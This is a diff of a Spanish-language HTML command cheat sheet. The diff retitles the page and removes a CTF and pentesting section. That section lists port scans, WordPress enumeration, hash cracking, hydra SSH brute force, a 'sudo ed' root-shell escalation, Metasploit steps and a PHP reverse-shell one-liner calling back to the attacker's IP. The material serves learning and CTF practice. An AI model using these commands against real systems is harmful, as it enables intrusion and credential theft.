@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Machete de Comandos</title>
+  <title>Comandos Basicos</title>
   <style>
     :root {
       --brick-fire: #B22222;
@@ -62,7 +62,7 @@
   </style>
 </head>
 <body>
-    <h1>Machete de Comandos</h1>
+    <h1>Machete Comandos Basicos</h1>
 <code>
 getent passw [información de usuarios]
 
@@ -153,24 +153,6 @@ tar -xf archivo.tar [extrae el contenido del archivo .tar]
 xxd archivo.txt [transforma binario a hexadecimal]
 
 xxd -r archivo.txt [transforma hexadecimal a binario]
-
-nc -zv ip puerto [verificar si un puerto está abierto en un host]
-
-nc ip puerto {contraseña} [conectar servidor a un puerto en específico]
-
-nc localhost puerto {contraseña} [conectar el servidor en el que estás a un puerto en específico]
-
-nc –lnvp puerto [creará un servidor de escucha, mostrará información sobre las conexiones y no intentará resolver los nombres de host de quienes se conecten. Estará esperando que alguien le envíe datos a ese puerto]
-
-ncat --ssl servidor puerto [sirve para crear una conexión más segura y con cifrado]
-
-ncat servidor puerto [sirve para crear conexiones de forma mucho más segura]
-
-nmap -p numpuerto-numpuerto ip o página [para escanear solo entre un rango de puertos de un número a otro]
-
-nmap -p puerto ip [es una herramienta que escanea redes para encontrar hosts, puertos abiertos y servicios activos]
-
-nmap página o ip [para ver qué puertos están abiertos en una máquina remota]
 
 ping página o ip [se usa para verificar la conectividad de red entre tu máquina y otra dirección]
 
@@ -306,73 +288,6 @@ git push origin --tags [Sube todos tus tags locales a tu repositorio remoto]
 
 jobs [ver procesos en segundo plano]
 
-#!/bin/bash [le indica al sistema operativo qué intérprete usar para ejecutar el script]
-
-python3 -c 'import pty;pty.spawn("/bin/bash");' [para invocar una shell si esta python3 instalado]
-
-sudo ed [dentro de ed, al usar el comando !/bin/sh, ejecutamos una shell con permisos de root, lo que nos da control total sobre el sistema. Esto se aprovecha en la escalada de privilegios en un CTF para obtener acceso como administrador]
-
-ip a [linux] / ipconfig [windows] [averiguar ip de nuestro dispositivo]
-
-ping (ip) [para ver si hay conexión con una ip]
-
-ncat -lvnp (puerto) [sirve para escuchar conexiones entrantes a un puerto, actuando como un servidor a la espera de que un cliente se conecte]
-
-nmap (ip)/24 [escanea todos los hosts en la red para detectar puertos abiertos y servicios activos]
-
-nmap -p (puerto) -sCV (ip) -oN (archivo.txt) [escanea un puerto específico de una ip para detectar servicios, versiones y posibles vulnerabilidades, y guarda el resultado en un archivo de texto]
-
-whatweb (ip) [sirve para identificar tecnologías y servicios usados por un sitio web]
-
-wpscan --url (ip) [es para identificar plugin o cosas vulnerables en un sitio WordPress]
-
-wpscan --url (ip) --enumerate u [sirve para enumerar los usuarios registrados en un sitio wordpress en busca de posibles vectores de ataque como fuerza bruta]
-
-gobuster dir -u http://IP/ -w (RutaDeWordlist) -x html,php,txt,zip -t 100 -k -r [El comando fuerza rutas ocultas en un sitio web usando una wordlist, probando extensiones .html, .php, .txt y .zip con 100 hilos, ignorando certificados y sin seguir redirecciones.]
-
-dirb (ip o url) (RutaDeWordlist) [fuerza rutas ocultas en un sitio web usando una wordlist]
-
-curl -v -X OPTIONS (ip o url) [realiza una solicitud OPTIONS a un sitio web]
-
-enum4linux (IP) [enumera usuarios, grupos, recursos compartidos SMB, políticas y más en sistemas Windows/Samba]
-
-zip2john archivo.zip > otroarchivo.zip [extrae el hash de la contraseña del archivo ZIP para que pueda ser crackeado por John the Ripper]
-
-ssh2john archivo > archivo.hash [Convierte el archivo de clave privada SSH en un formato que John the Ripper puede procesar, y guarda la salida en un archivo .hash para usarlo en un ataque de cracking de contraseña]
-
-john --wordlist=(RutaDeWordlist) --pot=contraseñaguardada.pot otroarchivo [usa John the Ripper con una wordlist para descifrar la contraseña del archivo a partir del hash y la guarda con el parámetro pot]
-
-john --format=sha512crypt --wordlist=(RutaDeWordlist) --pot=contraseñasdesifradas.pot contraseñas.hash [usa John the Ripper indicando el formato de encriptación de sha512 para descifrarlas a partir de un hash y guardarlo con el parámetro pot]
-
-hydra -l (usuario) -P (RutaDeWordlist) ssh://IP [realiza un ataque de fuerza bruta al servicio SSH usando el usuario "admin" y la wordlist "rockyou.txt" para intentar encontrar la contraseña]
-
-<?php $sock=fsockopen("IPnuestra",puerto);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?> [Es un script de .php que conecta el servidor vulnerable a tu máquina, abriendo una consola remota para que puedas controlar el sistema desde tu computadora]
-
-script /dev/null -c bash [sirve para convertir una shell limitada en una terminal interactiva completa que soporte comandos, flechas y autocompletado]
-
-uname -r [muestra la versión del kernel de Linux que está corriendo en el sistema]
-
-python3 -m http.server (puerto) [Levanta un servidor web simple en un puerto para compartir archivos de forma rápida desde el directorio donde lo ejecutás]
-
-gcc -pthread (archivo.c) -o (nombre del archivo a compilar) -lcrypt [compila un programa en C que aprovecha una vulnerabilidad para crear un usuario con permisos de administrador]
-
-rlogin -l root (ip) [intenta iniciar una sesión remota en otro sistema utilizando el usuario root]
-
-sudo msfdb init && msfconsole [inicia metasploit y su consola para pruebas de penetración que permite identificar, explotar y validar vulnerabilidades]
-
-search (modulo) [para buscar cualquier modulo para ejecutar]
-
-use (nombre del modulo) [para usar el modulo]
-
-set rhosts (ip) [para establecer la ip del objetivo]
-
-run [para ejecutar el modulo]
-
-exploit [para ejecutar el modulo]
-
-back [para salir del modulo y volver a la consola]
-
-exit [para salir de la consola de metasploit]
 </code>
     <p>Por Kapriel Monzón</p>
   </footer>
